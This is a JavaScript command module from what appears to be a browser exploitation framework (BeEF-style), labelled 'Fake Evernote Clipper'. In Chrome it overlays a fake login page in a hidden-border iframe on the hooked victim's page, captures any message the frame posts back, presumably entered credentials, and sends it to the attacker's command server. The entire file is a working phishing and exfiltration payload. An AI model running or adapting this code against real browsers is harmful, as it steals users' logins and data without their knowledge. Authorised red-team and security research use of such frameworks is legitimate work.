//
// Copyright (c) 2006-2025Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	// Prepare the onmessage event handling
	var eventMethod = window.addEventListener ? "addEventListener" : "attachEvent";
	var eventer = window[eventMethod];
	var messageEvent = eventMethod == "attachEvent" ? "onmessage" : "message";
	eventer(messageEvent,function(e) {
		if (e.data == "KILLFRAME") {
			server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Killing Frame');	
			server.net.send('<%= @command_url %>', <%= @command_id %>, 'meta=KILLFRAME');	
			server.dom.removeElement('EVIFRAME');
			return;
		} else {
			server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=' + e.data);	
		}
	},false);	

	if (server.browser.isC()) {
		server.dom.createIframe('custom', {'src':server.net.httpproto+'://'+server.net.host+':'+server.net.port+'/ev/login.html','id':'EVIFRAME'}, {'width':'317px','height':'336px','position':'fixed','right':'0px','top':'0px','z-index':server.dom.getHighestZindex()+1,'border':'0px','overflow':'hidden'}); 
		server.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Chrome IFrame Created .. awaiting messages');	
	} else {
		server.debug('[Fake Evernote Clipper] Unspported browser');
		server.net.send('<%= @command_url %>', <%= @command_id %>, 'fail=No IFrame Created -- browser is not Chrome', server.are.status_error());
	}

});
